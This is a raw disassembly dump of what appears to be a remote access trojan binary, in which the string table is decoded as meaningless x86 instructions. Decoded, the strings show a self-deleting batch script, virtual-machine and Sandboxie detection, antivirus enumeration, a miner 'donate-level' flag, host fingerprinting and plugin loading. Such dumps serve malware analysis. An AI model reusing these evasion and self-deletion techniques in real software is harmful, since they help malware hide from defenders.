  40bdce:	63 00                	arpl   %eax,(%eax)
  40bdd0:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40bdd6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bdda:	61                   	popa
  40bddb:	00 77 00             	add    %dh,0x0(%edi)
  40bdde:	74 00                	je     0x40bde0
  40bde0:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bde4:	53                   	push   %ebx
  40bde5:	00 00                	add    %al,(%eax)
  40bde7:	03 22                	add    (%edx),%esp
  40bde9:	00 00                	add    %al,(%eax)
  40bdeb:	09 2e                	or     %ebp,(%esi)
  40bded:	00 62 00             	add    %ah,0x0(%edx)
  40bdf0:	61                   	popa
  40bdf1:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bdf5:	13 40 00             	adc    0x0(%eax),%eax
  40bdf8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bdfc:	68 00 6f 00 20       	push   $0x20006f00
  40be01:	00 6f 00             	add    %ch,0x0(%edi)
  40be04:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40be08:	00 1f                	add    %bl,(%edi)
  40be0a:	74 00                	je     0x40be0c
  40be0c:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40be12:	6f                   	outsl  %ds:(%esi),(%dx)
  40be13:	00 75 00             	add    %dh,0x0(%ebp)
  40be16:	74 00                	je     0x40be18
  40be18:	20 00                	and    %al,(%eax)
  40be1a:	33 00                	xor    (%eax),%eax
  40be1c:	20 00                	and    %al,(%eax)
  40be1e:	3e 00 20             	add    %ah,%ds:(%eax)
  40be21:	00 4e 00             	add    %cl,0x0(%esi)
  40be24:	55                   	push   %ebp
  40be25:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40be29:	15 53 00 54 00       	adc    $0x540053,%eax
  40be2e:	41                   	inc    %ecx
  40be2f:	00 52 00             	add    %dl,0x0(%edx)
  40be32:	54                   	push   %esp
  40be33:	00 20                	add    %ah,(%eax)
  40be35:	00 22                	add    %ah,(%edx)
  40be37:	00 22                	add    %ah,(%edx)
  40be39:	00 20                	add    %ah,(%eax)
  40be3b:	00 22                	add    %ah,(%edx)
  40be3d:	00 00                	add    %al,(%eax)
  40be3f:	07                   	pop    %es
  40be40:	43                   	inc    %ebx
  40be41:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40be45:	00 00                	add    %al,(%eax)
  40be47:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40be4b:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40be4f:	00 22                	add    %ah,(%edx)
  40be51:	00 00                	add    %al,(%eax)
  40be53:	0f 22 00             	mov    %eax,%cr0
  40be56:	20 00                	and    %al,(%eax)
  40be58:	2f                   	das
  40be59:	00 66 00             	add    %ah,0x0(%esi)
  40be5c:	20 00                	and    %al,(%eax)
  40be5e:	2f                   	das
  40be5f:	00 71 00             	add    %dh,0x0(%ecx)
  40be62:	00 05 78 00 70 00    	add    %al,0x700078
  40be68:	00 45 53             	add    %al,0x53(%ebp)
  40be6b:	00 65 00             	add    %ah,0x0(%ebp)
  40be6e:	6c                   	insb   (%dx),%es:(%edi)
  40be6f:	00 65 00             	add    %ah,0x0(%ebp)
  40be72:	63 00                	arpl   %eax,(%eax)
  40be74:	74 00                	je     0x40be76
  40be76:	20 00                	and    %al,(%eax)
  40be78:	2a 00                	sub    (%eax),%al
  40be7a:	20 00                	and    %al,(%eax)
  40be7c:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40be80:	6f                   	outsl  %ds:(%esi),(%dx)
  40be81:	00 6d 00             	add    %ch,0x0(%ebp)
  40be84:	20 00                	and    %al,(%eax)
  40be86:	57                   	push   %edi
  40be87:	00 69 00             	add    %ch,0x0(%ecx)
  40be8a:	6e                   	outsb  %ds:(%esi),(%dx)
  40be8b:	00 33                	add    %dh,(%ebx)
  40be8d:	00 32                	add    %dh,(%edx)
  40be8f:	00 5f 00             	add    %bl,0x0(%edi)
  40be92:	43                   	inc    %ebx
  40be93:	00 6f 00             	add    %ch,0x0(%edi)
  40be96:	6d                   	insl   (%dx),%es:(%edi)
  40be97:	00 70 00             	add    %dh,0x0(%eax)
  40be9a:	75 00                	jne    0x40be9c
  40be9c:	74 00                	je     0x40be9e
  40be9e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bea2:	53                   	push   %ebx
  40bea3:	00 79 00             	add    %bh,0x0(%ecx)
  40bea6:	73 00                	jae    0x40bea8
  40bea8:	74 00                	je     0x40beaa
  40beaa:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40beae:	00 19                	add    %bl,(%ecx)
  40beb0:	4d                   	dec    %ebp
  40beb1:	00 61 00             	add    %ah,0x0(%ecx)
  40beb4:	6e                   	outsb  %ds:(%esi),(%dx)
  40beb5:	00 75 00             	add    %dh,0x0(%ebp)
  40beb8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40bebc:	63 00                	arpl   %eax,(%eax)
  40bebe:	74 00                	je     0x40bec0
  40bec0:	75 00                	jne    0x40bec2
  40bec2:	72 00                	jb     0x40bec4
  40bec4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bec8:	00 2b                	add    %ch,(%ebx)
  40beca:	6d                   	insl   (%dx),%es:(%edi)
  40becb:	00 69 00             	add    %ch,0x0(%ecx)
  40bece:	63 00                	arpl   %eax,(%eax)
  40bed0:	72 00                	jb     0x40bed2
  40bed2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bed3:	00 73 00             	add    %dh,0x0(%ebx)
  40bed6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bed7:	00 66 00             	add    %ah,0x0(%esi)
  40beda:	74 00                	je     0x40bedc
  40bedc:	20 00                	and    %al,(%eax)
  40bede:	63 00                	arpl   %eax,(%eax)
  40bee0:	6f                   	outsl  %ds:(%esi),(%dx)
  40bee1:	00 72 00             	add    %dh,0x0(%edx)
  40bee4:	70 00                	jo     0x40bee6
  40bee6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bee7:	00 72 00             	add    %dh,0x0(%edx)
  40beea:	61                   	popa
  40beeb:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40beef:	00 6f 00             	add    %ch,0x0(%edi)
  40bef2:	6e                   	outsb  %ds:(%esi),(%dx)
  40bef3:	00 00                	add    %al,(%eax)
  40bef5:	0b 4d 00             	or     0x0(%ebp),%ecx
  40bef8:	6f                   	outsl  %ds:(%esi),(%dx)
  40bef9:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40befd:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bf01:	0f 56 00             	orps   (%eax),%xmm0
  40bf04:	49                   	dec    %ecx
  40bf05:	00 52 00             	add    %dl,0x0(%edx)
  40bf08:	54                   	push   %esp
  40bf09:	00 55 00             	add    %dl,0x0(%ebp)
  40bf0c:	41                   	inc    %ecx
  40bf0d:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40bf11:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40bf16:	77 00                	ja     0x40bf18
  40bf18:	61                   	popa
  40bf19:	00 72 00             	add    %dh,0x0(%edx)
  40bf1c:	65 00 00             	add    %al,%gs:(%eax)
  40bf1f:	15 56 00 69 00       	adc    $0x690056,%eax
  40bf24:	72 00                	jb     0x40bf26
  40bf26:	74 00                	je     0x40bf28
  40bf28:	75 00                	jne    0x40bf2a
  40bf2a:	61                   	popa
  40bf2b:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40bf2f:	00 6f 00             	add    %ch,0x0(%edi)
  40bf32:	78 00                	js     0x40bf34
  40bf34:	00 17                	add    %dl,(%edi)
  40bf36:	53                   	push   %ebx
  40bf37:	00 62 00             	add    %ah,0x0(%edx)
  40bf3a:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40bf40:	6c                   	insb   (%dx),%es:(%edi)
  40bf41:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bf45:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40bf49:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bf4d:	1f                   	pop    %ds
  40bf4e:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40bf53:	00 6f 00             	add    %ch,0x0(%edi)
  40bf56:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf57:	00 61 00             	add    %ah,0x0(%ecx)
  40bf5a:	74 00                	je     0x40bf5c
  40bf5c:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  40bf63:	00 76 00             	add    %dh,0x0(%esi)
  40bf66:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  40bf6b:	00 01                	add    %al,(%ecx)
  40bf6d:	03 31                	add    (%ecx),%esi
  40bf6f:	00 00                	add    %al,(%eax)
  40bf71:	71 53                	jno    0x40bfc6
  40bf73:	00 45 00             	add    %al,0x0(%ebp)
  40bf76:	4c                   	dec    %esp
  40bf77:	00 45 00             	add    %al,0x0(%ebp)
  40bf7a:	43                   	inc    %ebx
  40bf7b:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bf7f:	00 43 00             	add    %al,0x0(%ebx)
  40bf82:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf83:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf86:	6d                   	insl   (%dx),%es:(%edi)
  40bf87:	00 61 00             	add    %ah,0x0(%ecx)
  40bf8a:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf8b:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40bf8f:	00 69 00             	add    %ch,0x0(%ecx)
  40bf92:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf93:	00 65 00             	add    %ah,0x0(%ebp)
  40bf96:	20 00                	and    %al,(%eax)
  40bf98:	46                   	inc    %esi
  40bf99:	00 52 00             	add    %dl,0x0(%edx)
  40bf9c:	4f                   	dec    %edi
  40bf9d:	00 4d 00             	add    %cl,0x0(%ebp)
  40bfa0:	20 00                	and    %al,(%eax)
  40bfa2:	57                   	push   %edi
  40bfa3:	00 69 00             	add    %ch,0x0(%ecx)
  40bfa6:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfa7:	00 33                	add    %dh,(%ebx)
  40bfa9:	00 32                	add    %dh,(%edx)
  40bfab:	00 5f 00             	add    %bl,0x0(%edi)
  40bfae:	50                   	push   %eax
  40bfaf:	00 72 00             	add    %dh,0x0(%edx)
  40bfb2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfb3:	00 63 00             	add    %ah,0x0(%ebx)
  40bfb6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bfba:	73 00                	jae    0x40bfbc
  40bfbc:	20 00                	and    %al,(%eax)
  40bfbe:	57                   	push   %edi
  40bfbf:	00 48 00             	add    %cl,0x0(%eax)
  40bfc2:	45                   	inc    %ebp
  40bfc3:	00 52 00             	add    %dl,0x0(%edx)
  40bfc6:	45                   	inc    %ebp
  40bfc7:	00 20                	add    %ah,(%eax)
  40bfc9:	00 50 00             	add    %dl,0x0(%eax)
  40bfcc:	72 00                	jb     0x40bfce
  40bfce:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfcf:	00 63 00             	add    %ah,0x0(%ebx)
  40bfd2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bfd6:	73 00                	jae    0x40bfd8
  40bfd8:	49                   	dec    %ecx
  40bfd9:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bfdd:	00 3d 00 20 00 00    	add    %bh,0x2000
  40bfe3:	17                   	pop    %ss
  40bfe4:	43                   	inc    %ebx
  40bfe5:	00 6f 00             	add    %ch,0x0(%edi)
  40bfe8:	6d                   	insl   (%dx),%es:(%edi)
  40bfe9:	00 6d 00             	add    %ch,0x0(%ebp)
  40bfec:	61                   	popa
  40bfed:	00 6e 00             	add    %ch,0x0(%esi)
  40bff0:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40bff5:	00 6e 00             	add    %ch,0x0(%esi)
  40bff8:	65 00 00             	add    %al,%gs:(%eax)
  40bffb:	11 45 00             	adc    %eax,0x0(%ebp)
  40bffe:	72 00                	jb     0x40c000
  40c000:	72 00                	jb     0x40c002
  40c002:	20 00                	and    %al,(%eax)
  40c004:	48                   	dec    %eax
  40c005:	00 57 00             	add    %dl,0x0(%edi)
  40c008:	49                   	dec    %ecx
  40c009:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c00d:	05 78 00 32 00       	add    $0x320078,%eax
  40c012:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c018:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c01e:	74 00                	je     0x40c020
  40c020:	49                   	dec    %ecx
  40c021:	00 6e 00             	add    %ch,0x0(%esi)
  40c024:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c028:	00 09                	add    %cl,(%ecx)
  40c02a:	48                   	dec    %eax
  40c02b:	00 57 00             	add    %dl,0x0(%edi)
  40c02e:	49                   	dec    %ecx
  40c02f:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c033:	09 55 00             	or     %edx,0x0(%ebp)
  40c036:	73 00                	jae    0x40c038
  40c038:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c03c:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c042:	00 13                	add    %dl,(%ebx)
  40c044:	4d                   	dec    %ebp
  40c045:	00 69 00             	add    %ch,0x0(%ecx)
  40c048:	63 00                	arpl   %eax,(%eax)
  40c04a:	72 00                	jb     0x40c04c
  40c04c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c04d:	00 73 00             	add    %dh,0x0(%ebx)
  40c050:	6f                   	outsl  %ds:(%esi),(%dx)
  40c051:	00 66 00             	add    %ah,0x0(%esi)
  40c054:	74 00                	je     0x40c056
  40c056:	00 03                	add    %al,(%ebx)
  40c058:	20 00                	and    %al,(%eax)
  40c05a:	00 09                	add    %cl,(%ecx)
  40c05c:	54                   	push   %esp
  40c05d:	00 72 00             	add    %dh,0x0(%edx)
  40c060:	75 00                	jne    0x40c062
  40c062:	65 00 00             	add    %al,%gs:(%eax)
  40c065:	0b 36                	or     (%esi),%esi
  40c067:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c06a:	62 00                	bound  %eax,(%eax)
  40c06c:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c072:	46                   	inc    %esi
  40c073:	00 61 00             	add    %ah,0x0(%ecx)
  40c076:	6c                   	insb   (%dx),%es:(%edi)
  40c077:	00 73 00             	add    %dh,0x0(%ebx)
  40c07a:	65 00 00             	add    %al,%gs:(%eax)
  40c07d:	0b 33                	or     (%ebx),%esi
  40c07f:	00 32                	add    %dh,(%edx)
  40c081:	00 62 00             	add    %ah,0x0(%edx)
  40c084:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c08a:	50                   	push   %eax
  40c08b:	00 61 00             	add    %ah,0x0(%ecx)
  40c08e:	74 00                	je     0x40c090
  40c090:	68 00 00 0f 56       	push   $0x560f0000
  40c095:	00 65 00             	add    %ah,0x0(%ebp)
  40c098:	72 00                	jb     0x40c09a
  40c09a:	73 00                	jae    0x40c09c
  40c09c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c0a2:	00 0b                	add    %cl,(%ebx)
  40c0a4:	41                   	inc    %ecx
  40c0a5:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c0a9:	00 69 00             	add    %ch,0x0(%ecx)
  40c0ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0ad:	00 00                	add    %al,(%eax)
  40c0af:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c0b3:	00 75 00             	add    %dh,0x0(%ebp)
  40c0b6:	65 00 00             	add    %al,%gs:(%eax)
  40c0b9:	0b 66 00             	or     0x0(%esi),%esp
  40c0bc:	61                   	popa
  40c0bd:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c0c1:	00 65 00             	add    %ah,0x0(%ebp)
  40c0c4:	00 17                	add    %dl,(%edi)
  40c0c6:	50                   	push   %eax
  40c0c7:	00 65 00             	add    %ah,0x0(%ebp)
  40c0ca:	72 00                	jb     0x40c0cc
  40c0cc:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c0d0:	72 00                	jb     0x40c0d2
  40c0d2:	6d                   	insl   (%dx),%es:(%edi)
  40c0d3:	00 61 00             	add    %ah,0x0(%ecx)
  40c0d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0d7:	00 63 00             	add    %ah,0x0(%ebx)
  40c0da:	65 00 00             	add    %al,%gs:(%eax)
  40c0dd:	11 50 00             	adc    %edx,0x0(%eax)
  40c0e0:	61                   	popa
  40c0e1:	00 73 00             	add    %dh,0x0(%ebx)
  40c0e4:	74 00                	je     0x40c0e6
  40c0e6:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c0ea:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c0f0:	41                   	inc    %ecx
  40c0f1:	00 6e 00             	add    %ch,0x0(%esi)
  40c0f4:	74 00                	je     0x40c0f6
  40c0f6:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c0fc:	72 00                	jb     0x40c0fe
  40c0fe:	75 00                	jne    0x40c100
  40c100:	73 00                	jae    0x40c102
  40c102:	00 13                	add    %dl,(%ebx)
  40c104:	49                   	dec    %ecx
  40c105:	00 6e 00             	add    %ch,0x0(%esi)
  40c108:	73 00                	jae    0x40c10a
  40c10a:	74 00                	je     0x40c10c
  40c10c:	61                   	popa
  40c10d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c111:	00 65 00             	add    %ah,0x0(%ebp)
  40c114:	64 00 00             	add    %al,%fs:(%eax)
  40c117:	09 50 00             	or     %edx,0x0(%eax)
  40c11a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c11b:	00 6e 00             	add    %ch,0x0(%esi)
  40c11e:	67 00 00             	add    %al,(%bx,%si)
  40c121:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40c126:	00 2b                	add    %ch,(%ebx)
  40c128:	5c                   	pop    %esp
  40c129:	00 72 00             	add    %dh,0x0(%edx)
  40c12c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c12d:	00 6f 00             	add    %ch,0x0(%edi)
  40c130:	74 00                	je     0x40c132
  40c132:	5c                   	pop    %esp
  40c133:	00 53 00             	add    %dl,0x0(%ebx)
  40c136:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c13a:	75 00                	jne    0x40c13c
  40c13c:	72 00                	jb     0x40c13e
  40c13e:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c144:	43                   	inc    %ebx
  40c145:	00 65 00             	add    %ah,0x0(%ebp)
  40c148:	6e                   	outsb  %ds:(%esi),(%dx)
  40c149:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c14d:	00 72 00             	add    %dh,0x0(%edx)
  40c150:	32 00                	xor    (%eax),%al
  40c152:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c158:	6c                   	insb   (%dx),%es:(%edi)
  40c159:	00 65 00             	add    %ah,0x0(%ebp)
  40c15c:	63 00                	arpl   %eax,(%eax)
  40c15e:	74 00                	je     0x40c160
  40c160:	20 00                	and    %al,(%eax)
  40c162:	2a 00                	sub    (%eax),%al
  40c164:	20 00                	and    %al,(%eax)
  40c166:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c16a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c16b:	00 6d 00             	add    %ch,0x0(%ebp)
  40c16e:	20 00                	and    %al,(%eax)
  40c170:	41                   	inc    %ecx
  40c171:	00 6e 00             	add    %ch,0x0(%esi)
  40c174:	74 00                	je     0x40c176
  40c176:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c17c:	72 00                	jb     0x40c17e
  40c17e:	75 00                	jne    0x40c180
  40c180:	73 00                	jae    0x40c182
  40c182:	50                   	push   %eax
  40c183:	00 72 00             	add    %dh,0x0(%edx)
  40c186:	6f                   	outsl  %ds:(%esi),(%dx)
  40c187:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c18b:	00 63 00             	add    %ah,0x0(%ebx)
  40c18e:	74 00                	je     0x40c190
  40c190:	00 17                	add    %dl,(%edi)
  40c192:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c196:	73 00                	jae    0x40c198
  40c198:	70 00                	jo     0x40c19a
  40c19a:	6c                   	insb   (%dx),%es:(%edi)
  40c19b:	00 61 00             	add    %ah,0x0(%ecx)
  40c19e:	79 00                	jns    0x40c1a0
  40c1a0:	4e                   	dec    %esi
  40c1a1:	00 61 00             	add    %ah,0x0(%ecx)
  40c1a4:	6d                   	insl   (%dx),%es:(%edi)
  40c1a5:	00 65 00             	add    %ah,0x0(%ebp)
  40c1a8:	00 07                	add    %al,(%edi)
  40c1aa:	4e                   	dec    %esi
  40c1ab:	00 2f                	add    %ch,(%edi)
  40c1ad:	00 41 00             	add    %al,0x0(%ecx)
  40c1b0:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c1b6:	00 13                	add    %dl,(%ebx)
  40c1b8:	53                   	push   %ebx
  40c1b9:	00 6f 00             	add    %ch,0x0(%edi)
  40c1bc:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c1c1:	00 61 00             	add    %ah,0x0(%ecx)
  40c1c4:	72 00                	jb     0x40c1c6
  40c1c6:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c1cb:	09 70 00             	or     %esi,0x0(%eax)
  40c1ce:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1cf:	00 6e 00             	add    %ch,0x0(%esi)
  40c1d2:	67 00 00             	add    %al,(%bx,%si)
  40c1d5:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c1da:	75 00                	jne    0x40c1dc
  40c1dc:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1e0:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1e1:	00 00                	add    %al,(%eax)
  40c1e3:	15 73 00 61 00       	adc    $0x610073,%eax
  40c1e8:	76 00                	jbe    0x40c1ea
  40c1ea:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c1ee:	6c                   	insb   (%dx),%es:(%edi)
  40c1ef:	00 75 00             	add    %dh,0x0(%ebp)
  40c1f2:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1f6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1f7:	00 00                	add    %al,(%eax)
  40c1f9:	07                   	pop    %es
  40c1fa:	44                   	inc    %esp
  40c1fb:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c1ff:	00 00                	add    %al,(%eax)
  40c201:	15 73 00 65 00       	adc    $0x650073,%eax
  40c206:	6e                   	outsb  %ds:(%esi),(%dx)
  40c207:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c20b:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c20f:	00 67 00             	add    %ah,0x0(%edi)
  40c212:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c218:	48                   	dec    %eax
  40c219:	00 61 00             	add    %ah,0x0(%ecx)
  40c21c:	73 00                	jae    0x40c21e
  40c21e:	68 00 65 00 73       	push   $0x73006500
  40c223:	00 00                	add    %al,(%eax)
  40c225:	09 48 00             	or     %ecx,0x0(%eax)
  40c228:	61                   	popa
  40c229:	00 73 00             	add    %dh,0x0(%ebx)
  40c22c:	68 00 00 1b 50       	push   $0x501b0000
  40c231:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c235:	00 67 00             	add    %ah,0x0(%edi)
  40c238:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c23e:	50                   	push   %eax
  40c23f:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c243:	00 67 00             	add    %ah,0x0(%edi)
  40c246:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c24c:	52                   	push   %edx
  40c24d:	00 75 00             	add    %dh,0x0(%ebp)
  40c250:	6e                   	outsb  %ds:(%esi),(%dx)
  40c251:	00 00                	add    %al,(%eax)
  40c253:	0f 4d 00             	cmovge (%eax),%eax
  40c256:	73 00                	jae    0x40c258
  40c258:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c25c:	61                   	popa
  40c25d:	00 63 00             	add    %ah,0x0(%ebx)
  40c260:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c263:	11 52 00             	adc    %edx,0x0(%edx)
  40c266:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c26a:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c26e:	76 00                	jbe    0x40c270
  40c270:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c275:	0b 45 00             	or     0x0(%ebp),%eax
  40c278:	72 00                	jb     0x40c27a
  40c27a:	72 00                	jb     0x40c27c
  40c27c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c27d:	00 72 00             	add    %dh,0x0(%edx)
  40c280:	00 47 6d             	add    %al,0x6d(%edi)
  40c283:	00 61 00             	add    %ah,0x0(%ecx)
  40c286:	73 00                	jae    0x40c288
  40c288:	74 00                	je     0x40c28a
  40c28a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c28e:	4b                   	dec    %ebx
  40c28f:	00 65 00             	add    %ah,0x0(%ebp)
  40c292:	79 00                	jns    0x40c294
  40c294:	20 00                	and    %al,(%eax)
  40c296:	63 00                	arpl   %eax,(%eax)
  40c298:	61                   	popa
  40c299:	00 6e 00             	add    %ch,0x0(%esi)
  40c29c:	20 00                	and    %al,(%eax)
  40c29e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c29f:	00 6f 00             	add    %ch,0x0(%edi)
  40c2a2:	74 00                	je     0x40c2a4
  40c2a4:	20 00                	and    %al,(%eax)
  40c2a6:	62 00                	bound  %eax,(%eax)
  40c2a8:	65 00 20             	add    %ah,%gs:(%eax)
  40c2ab:	00 6e 00             	add    %ch,0x0(%esi)
  40c2ae:	75 00                	jne    0x40c2b0
  40c2b0:	6c                   	insb   (%dx),%es:(%edi)
  40c2b1:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c2b5:	00 6f 00             	add    %ch,0x0(%edi)
  40c2b8:	72 00                	jb     0x40c2ba
  40c2ba:	20 00                	and    %al,(%eax)
  40c2bc:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2c0:	70 00                	jo     0x40c2c2
  40c2c2:	74 00                	je     0x40c2c4
  40c2c4:	79 00                	jns    0x40c2c6
  40c2c6:	2e 00 00             	add    %al,%cs:(%eax)
  40c2c9:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c2ce:	70 00                	jo     0x40c2d0
  40c2d0:	75 00                	jne    0x40c2d2
  40c2d2:	74 00                	je     0x40c2d4
  40c2d4:	20 00                	and    %al,(%eax)
  40c2d6:	63 00                	arpl   %eax,(%eax)
  40c2d8:	61                   	popa
  40c2d9:	00 6e 00             	add    %ch,0x0(%esi)
  40c2dc:	20 00                	and    %al,(%eax)
  40c2de:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2df:	00 6f 00             	add    %ch,0x0(%edi)
  40c2e2:	74 00                	je     0x40c2e4
  40c2e4:	20 00                	and    %al,(%eax)
  40c2e6:	62 00                	bound  %eax,(%eax)
  40c2e8:	65 00 20             	add    %ah,%gs:(%eax)
  40c2eb:	00 6e 00             	add    %ch,0x0(%esi)
  40c2ee:	75 00                	jne    0x40c2f0
  40c2f0:	6c                   	insb   (%dx),%es:(%edi)
  40c2f1:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c2f5:	00 00                	add    %al,(%eax)
  40c2f7:	55                   	push   %ebp
  40c2f8:	49                   	dec    %ecx
  40c2f9:	00 6e 00             	add    %ch,0x0(%esi)
  40c2fc:	76 00                	jbe    0x40c2fe
  40c2fe:	61                   	popa
  40c2ff:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c303:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c307:	00 6d 00             	add    %ch,0x0(%ebp)
  40c30a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c30e:	73 00                	jae    0x40c310
  40c310:	61                   	popa
  40c311:	00 67 00             	add    %ah,0x0(%edi)
  40c314:	65 00 20             	add    %ah,%gs:(%eax)
  40c317:	00 61 00             	add    %ah,0x0(%ecx)
  40c31a:	75 00                	jne    0x40c31c
  40c31c:	74 00                	je     0x40c31e
  40c31e:	68 00 65 00 6e       	push   $0x6e006500
  40c323:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c327:	00 63 00             	add    %ah,0x0(%ebx)
  40c32a:	61                   	popa
  40c32b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c32f:	00 6f 00             	add    %ch,0x0(%edi)
  40c332:	6e                   	outsb  %ds:(%esi),(%dx)
  40c333:	00 20                	add    %ah,(%eax)
  40c335:	00 63 00             	add    %ah,0x0(%ebx)
  40c338:	6f                   	outsl  %ds:(%esi),(%dx)
  40c339:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c33d:	00 20                	add    %ah,(%eax)
  40c33f:	00 28                	add    %ch,(%eax)
  40c341:	00 4d 00             	add    %cl,0x0(%ebp)
